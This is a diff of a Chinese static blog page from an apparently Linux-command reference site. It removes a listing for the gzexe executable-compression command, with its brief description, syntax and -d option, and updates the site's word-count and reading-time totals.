-      <time title="创建时间：2020-09-25 08:00:00 08:00:00" itemprop="dateCreated datePublished" datetime="2020-09-25T08:00:00+08:00">2020-09-25 08:00:00</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-09-25 09:31:30 09:31:30" itemprop="dateModified" datetime="2020-09-25T09:31:30+08:00">2020-09-25 09:31:30</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Linux-%E5%91%BD%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">Linux 命令</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
-    
-    <a title="disqus" href="/linux-command/gzexe/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux-command/gzexe/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>184</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>用来压缩可执行文件</p>
-<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p><strong>gzexe命令</strong> 用来压缩可执行文件，压缩后的文件仍然为可执行文件，在执行时进行自动解压缩。当您去执行被压缩过的执行文件时，该文件会自动解压然后继续执行，和使用一般的执行文件相同。这个命令也可以看成是gunzip命令的一个扩展。</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzexe(选项)(参数)</span><br></pre></td></tr></table></figure>
-
-<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-d：解压缩被gzexe压缩过的可执行文件。</span><br></pre></td></tr></table></figure>
-
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>文件：指定需要压缩的可执行文件。</p>
-<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
 
   
   <nav class="pagination">
@@ -1653,14 +1667,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">935k</span>
+    <span title="站点总字数">939k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">14:10</span>
+    <span title="站点阅读时长">14:14</span>
   </span>
 </div>
 <div class="busuanzi-count">
